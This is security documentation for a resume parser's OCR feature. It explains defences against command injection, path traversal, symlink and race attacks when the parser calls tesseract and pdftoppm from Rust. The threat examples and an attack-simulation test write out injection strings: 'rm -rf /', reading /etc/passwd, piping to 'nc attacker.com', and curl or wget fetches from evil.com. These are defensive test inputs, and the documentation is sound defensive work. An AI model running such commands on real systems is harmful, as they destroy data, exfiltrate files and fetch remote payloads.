# OCR and Command Execution Security

> JobSentinel Security Documentation

---

## Overview

JobSentinel's Resume Parser includes OCR (Optical Character Recognition) support for extracting text from
scanned PDF resumes. This feature requires executing external command-line tools (`tesseract` and `pdftoppm`),
which introduces security risks if not properly implemented. OCR tool execution uses canonical absolute paths
and does not rely on ambient `PATH` lookup.

This document describes the security measures in place to prevent command injection, path traversal, and other
command execution vulnerabilities.

## OCR Architecture

### Dependencies

JobSentinel's OCR feature uses two external tools:

1. **Tesseract OCR**: Extracts text from images
   - macOS: `brew install tesseract`
   - Linux: `apt install tesseract-ocr`
   - Windows: Download from GitHub releases

2. **Poppler (pdftoppm)**: Converts PDF pages to images
   - macOS: `brew install poppler`
   - Linux: `apt install poppler-utils`
   - Windows: Download poppler binaries

Advanced builds may set `JOBSENTINEL_TESSERACT_PATH` and `JOBSENTINEL_PDFTOPPM_PATH`, but each value must be
an absolute path to a regular executable file in a known install location. If those variables are not set,
JobSentinel checks known install locations such as Homebrew, `/usr/bin`, and common Windows Program Files
paths.

### Workflow

```text
PDF file -> pdftoppm -> PNG images -> tesseract -> extracted text
```

**File**: `crates/jobsentinel-documents/src/parser.rs`

Local resume parsing rejects files over 10 MB before PDF, DOCX, TXT, Markdown,
HTML, or optional OCR parsing begins. DOCX parsing also bounds `word/document.xml`
before extracting text.

## Security Threats

### 1. Command Injection

**Threat**: Attacker provides malicious input that gets executed as a shell command.

```rust
// Vulnerable: shell injection risk
let command = format!("tesseract {} output", user_provided_path);
std::process::Command::new("sh")
    .arg("-c")
    .arg(&command)  // Arbitrary command execution!
    .output()?;
```

**Attack Example**:

```text
user_provided_path = "file.pdf; rm -rf /"
Executes: tesseract file.pdf; rm -rf / output
```

### 2. Path Traversal

**Threat**: Attacker provides paths like `../../etc/passwd` to access files outside allowed directories.

```rust
// Vulnerable: path traversal
let file_path = format!("/resumes/{}", user_input);
let text = parse_pdf(&file_path)?;
```

**Attack Example**:

```text
user_input = "../../../../etc/shadow"
Accesses: /resumes/../../../../etc/shadow -> /etc/shadow
```

### 3. Symlink Attacks

**Threat**: Attacker creates a symlink in the temp directory pointing to sensitive files.

```rust
// Vulnerable: symlink not validated
let temp_file = temp_dir.join("output.png");
// If temp_file is a symlink to /etc/passwd...
tesseract_command.arg(&temp_file); // Might overwrite /etc/passwd
```

### 4. Race Conditions

**Threat**: Attacker replaces files between validation and use (TOCTOU - Time Of Check, Time Of Use).

```rust
// Vulnerable: race condition
if path.exists() && path.is_file() {
    // Attacker replaces file here!
    let content = std::fs::read(path)?;
}
```

## Security Measures

### 1. Path Canonicalization

**Purpose**: Resolve symlinks and prevent `../` traversal attacks.

```rust
/// Parse PDF file and extract text content
pub fn parse_pdf(&self, file_path: &Path) -> Result<String> {
    // Security: Canonicalize path to prevent path traversal attacks
    // This resolves symlinks and removes ../ components
    let canonical_path = file_path
        .canonicalize()
        .context("Invalid or inaccessible path")?;

    // Security: Verify the canonical path still exists
    if !canonical_path.exists() {
        return Err(anyhow::anyhow!("File not found"));
    }

    // Security: Verify the canonical path is a regular file
    if !canonical_path.is_file() {
        return Err(anyhow::anyhow!("Path is not a regular file"));
    }

    // Verify it's a PDF file
    if canonical_path.extension().and_then(|s| s.to_str()) != Some("pdf") {
        return Err(anyhow::anyhow!("File must be a PDF"));
    }

    // Now safe to use canonical_path internally. Do not return raw local paths
    // in renderer-visible errors.
    // ...
}
```

**What this prevents**:

- Path traversal: `../../etc/passwd` fails validation
- Symlink attacks: resolves to the real file path
- Non-existent files: caught before use
- Directories: only regular files allowed
- Wrong file types: must be `.pdf`

### 2. No Shell Invocation

**Purpose**: Pass arguments directly to avoid shell injection.

```rust
// Unsafe: uses shell
Command::new("sh")
    .arg("-c")
    .arg(format!("tesseract {} output", path))
    .output()?;

// Safe: canonical absolute executable path, direct execution, no shell
let tesseract_path = resolve_ocr_tool(OcrTool::Tesseract)?;
Command::new(&tesseract_path)
    .arg(path)           // Argument 1
    .arg("stdout")       // Argument 2
    .arg("-l")           // Argument 3
    .arg("eng")          // Argument 4
    .output()?;
```

**Why this is secure**:

- Arguments are passed as-is to the program
- No shell interpretation
- No globbing, expansion, or command substitution
- Special characters are literal values
- OCR executables are resolved before execution; the operating system does not search `PATH`

### 3. Controlled Temp Directory

**Purpose**: Atomically create a unique directory with automatic cleanup.

```rust
let temp_dir = tempfile::Builder::new()
    .prefix("jobsentinel_ocr_")
    .tempdir()
    .context("Failed to create temp directory for OCR")?;
```

**What this prevents**:

- Race conditions: `tempfile` creates the directory atomically
- File overwrites: each run uses a unique directory
- Temp file leaks: `TempDir` removes its directory when dropped
- Privilege escalation: no predictable output path is reused

### 4. Output Path Validation

**Purpose**: Ensure generated files stay within the controlled temp directory.

```rust
// Convert PDF pages to images
let output_prefix = temp_dir.path().join("page");

let pdftoppm_path = resolve_ocr_tool(OcrTool::PdfToPpm)?;
let pdftoppm_result = Command::new(&pdftoppm_path)
    .arg("-png")
    .arg("-r")
    .arg("300")
    .arg(file_path)      // Canonicalized in parse_pdf()
    .arg(&output_prefix) // Controlled temp directory
    .output();

// Security: Validate all generated image files
let mut image_paths: Vec<PathBuf> = std::fs::read_dir(temp_dir.path())?
    .filter_map(|e| e.ok())
    .map(|e| e.path())
    .filter(|p| {
        // Extension check
        if p.extension().map(|e| e == "png").unwrap_or(false) {
            // Security: Verify path is within temp_dir
            if let Ok(canonical) = p.canonicalize() {
                if let Ok(canonical_temp) = temp_dir.path().canonicalize() {
                    // Ensure canonical path is still in temp_dir
                    return canonical.starts_with(&canonical_temp) && canonical.is_file();
                }
            }
        }
        false
    })
    .collect();
```

**What this prevents**:

- Symlink attacks: canonicalize before checking
- Directory escape: generated files must remain within `temp_dir`
- Non-PNG files: extension validation filters them out
- Directories: generated paths must be regular files

### 5. Hardcoded Command Arguments

**Purpose**: Never allow user input to influence command flags.

```rust
// Safe: all flags are hardcoded
let tesseract_path = resolve_ocr_tool(OcrTool::Tesseract)?;
let output = Command::new(&tesseract_path)
    .arg(image_path)    // User data (but validated path)
    .arg("stdout")      // Hardcoded: output destination
    .arg("-l")          // Hardcoded: language flag
    .arg("eng")         // Hardcoded: English language
    .output()
    .context("Failed to run Tesseract OCR")?;

// Unsafe: user controls flags
let output = Command::new("tesseract")
    .arg(image_path)
    .arg(user_output_mode)  // Could be "--config malicious.cfg"
    .arg("-l")
    .arg(user_language)     // Could be "../../../etc/passwd"
    .output()?;
```

**What this prevents**:

- Flag injection: only predefined flags are used
- Config file attacks: no user-controlled configs are accepted
- Output redirection: output goes to `stdout`

### 6. Feature Flag Control

**Purpose**: OCR is opt-in and can be disabled at compile time.

```toml
# Cargo.toml
[features]
default = []
ocr = []
```

```rust
/// Check if OCR is available for scanned PDFs
pub fn is_ocr_available(&self) -> bool {
    #[cfg(feature = "ocr")]
    {
        self.ocr_available
    }

    #[cfg(not(feature = "ocr"))]
    {
        false
    }
}
```

**What this enables**:

- Reduced attack surface: OCR can be disabled
- Deployment flexibility: enable only when needed
- Faster builds: skip dependencies if OCR is not used

### 7. Runtime Tool Validation

**Purpose**: Check that external tools resolve to absolute regular files in trusted install locations before
attempting to use them.

```rust
#[cfg(feature = "ocr")]
fn resolve_ocr_tool(tool: OcrTool) -> Result<PathBuf> {
    if let Some(path) = std::env::var_os(tool.env_var()).filter(|value| !value.is_empty()) {
        return validate_ocr_tool_path(tool, PathBuf::from(path));
    }

    for candidate in tool.default_candidates() {
        let path = PathBuf::from(candidate);
        if path.is_file() {
            return validate_ocr_tool_path(tool, path);
        }
    }

    Err(anyhow::anyhow!("OCR executable was not found in a trusted install location"))
}

#[cfg(feature = "ocr")]
fn validate_ocr_tool_path(tool: OcrTool, path: PathBuf) -> Result<PathBuf> {
    if !path.is_absolute() {
        return Err(anyhow::anyhow!("OCR tool path must be absolute"));
    }

    let canonical_path = path.canonicalize().context("OCR executable is not accessible")?;
    if !canonical_path.is_file() {
        return Err(anyhow::anyhow!("OCR executable path is not a regular file"));
    }
    if !is_parent_in_trusted_install_roots(&path, tool.trusted_roots()) {
        return Err(anyhow::anyhow!("OCR executable path must be in a trusted install location"));
    }

    Ok(canonical_path)
}
```

**What this prevents**:

- Current-directory or `PATH` hijacking
- Relative executable overrides
- Arbitrary executable overrides from temporary or user-writable directories
- Directory or device paths being executed
- Raw tool paths leaking through normal OCR availability checks
- Missing tools fail closed before OCR attempts

## Complete Security Flow

### Step-by-Step Validation

```rust
// 1. Canonicalize input path (resolves symlinks, removes ../)
let canonical_path = file_path.canonicalize()?;

// 2. Verify file exists
if !canonical_path.exists() { return Err(...); }

// 3. Verify it's a regular file (not directory/device)
if !canonical_path.is_file() { return Err(...); }

// 4. Verify file extension
if canonical_path.extension() != Some("pdf") { return Err(...); }

// 5. Atomically create a unique, automatically cleaned temp directory
let temp_dir = tempfile::Builder::new()
    .prefix("jobsentinel_ocr_")
    .tempdir()?;

// 6. Resolve OCR tools to canonical absolute paths
let pdftoppm_path = resolve_ocr_tool(OcrTool::PdfToPpm)?;
let tesseract_path = resolve_ocr_tool(OcrTool::Tesseract)?;

// 7. Execute pdftoppm with validated paths
Command::new(&pdftoppm_path)
    .arg("-png")                    // Hardcoded flag
    .arg("-r")                      // Hardcoded flag
    .arg("300")                     // Hardcoded value
    .arg(&canonical_path)           // Validated input
    .arg(&temp_dir.path().join("page")) // Controlled output
    .output()?;

// 8. Validate each generated image file
for image_path in generated_images {
    let canonical_image = image_path.canonicalize()?;
    let canonical_temp = temp_dir.path().canonicalize()?;

    // Must be within temp_dir
    if !canonical_image.starts_with(&canonical_temp) {
        continue; // Skip
    }

    // Must be a regular file
    if !canonical_image.is_file() {
        continue;
    }

    // Must be PNG
    if canonical_image.extension() != Some("png") {
        continue;
    }

    // Now safe to process
    Command::new(&tesseract_path)
        .arg(&canonical_image)  // Validated path
        .arg("stdout")          // Hardcoded
        .arg("-l")              // Hardcoded
        .arg("eng")             // Hardcoded
        .output()?;
}

// 9. Cleanup temp directory
std::fs::remove_dir_all(&temp_dir)?;
```

## Best Practices

### 1. Never use `sh -c` or similar shell invocation

```rust
// Dangerous
Command::new("sh").arg("-c").arg(user_input).output()?;
Command::new("bash").arg("-c").arg(user_input).output()?;
Command::new("cmd").arg("/C").arg(user_input).output()?;

// Safe
Command::new("program").arg(arg1).arg(arg2).output()?;
```

### 2. Always canonicalize paths before use

```rust
// Canonicalize first
let path = user_input.canonicalize()?;

// Then validate
if !path.is_file() { return Err(...); }
if !path.starts_with(&allowed_dir) { return Err(...); }

// Now safe to use
process_file(&path)?;
```

### 3. Use allowlists for file extensions

```rust
const ALLOWED_EXTENSIONS: &[&str] = &["pdf", "png", "jpg"];

let ext = path.extension()
    .and_then(|s| s.to_str())
    .ok_or_else(|| anyhow!("No file extension"))?;

if !ALLOWED_EXTENSIONS.contains(&ext) {
    return Err(anyhow!("File type not allowed: {}", ext));
}
```

### 4. Use atomic unique temp files/directories

```rust
// Atomically created, unique, and removed on drop
let temp_file = tempfile::Builder::new()
    .prefix("jobsentinel_")
    .tempfile()?;

// Predictable, race conditions
let temp_file = format!("/tmp/jobsentinel_{}.tmp", user_id);
```

### 5. Always clean up temp files

```rust
let temp_dir = tempfile::Builder::new()
    .prefix("jobsentinel_")
    .tempdir()?;

// Do work with temp_dir
// ...

// Cleanup happens automatically when temp_dir is dropped
```

### 6. Validate command output

```rust
let tesseract_path = resolve_ocr_tool(OcrTool::Tesseract)?;
let output = Command::new(&tesseract_path)
    .arg(image_path)
    .arg("stdout")
    .output()?;

// Check exit status
if !output.status.success() {
    return Err(anyhow!("Tesseract failed: {}",
        String::from_utf8_lossy(&output.stderr)));
}

// Validate output size
if output.stdout.len() > MAX_OUTPUT_SIZE {
    return Err(anyhow!("Output too large"));
}

// Convert to UTF-8
let text = String::from_utf8(output.stdout)
    .map_err(|_| anyhow!("Invalid UTF-8 output"))?;
```

## Testing Command Execution Security

### Unit Tests

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rejects_path_traversal() {
        let parser = ResumeParser::new();
        let result = parser.parse_pdf(Path::new("../../etc/passwd"));
        assert!(result.is_err());
    }

    #[test]
    fn test_rejects_non_pdf() {
        let parser = ResumeParser::new();
        let result = parser.parse_pdf(Path::new("/tmp/malicious.sh"));
        assert!(result.is_err());
    }

    #[test]
    fn test_rejects_directory() {
        let parser = ResumeParser::new();
        let result = parser.parse_pdf(Path::new("/tmp/"));
        assert!(result.is_err());
    }

    #[test]
    fn test_temp_dir_cleanup() {
        let parser = ResumeParser::new();
        let temp_count_before = count_temp_dirs();

        let _ = parser.parse_pdf(Path::new("test.pdf"));

        let temp_count_after = count_temp_dirs();
        assert_eq!(temp_count_before, temp_count_after);
    }
}
```

### Attack Simulation

```rust
#[test]
fn test_command_injection_attempts() {
    let parser = ResumeParser::new();

    let attack_paths = vec![
        "file.pdf; rm -rf /",
        "file.pdf && cat /etc/passwd",
        "file.pdf | nc attacker.com 1234",
        "$(curl http://evil.com/shell.sh)",
        "`wget http://evil.com/malware`",
    ];

    for path in attack_paths {
        let result = parser.parse_pdf(Path::new(path));
        assert!(result.is_err(), "Failed to reject: {}", path);
    }
}
```

## Related Documentation

- [URL Validation Security](./URL_VALIDATION.md)
- [Security Policy](../../SECURITY.md)
- [Resume Builder](../features/resume-builder.md)
- [Resume Match](../features/resume-matcher.md)

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [Rust std::process::Command](https://doc.rust-lang.org/std/process/struct.Command.html)
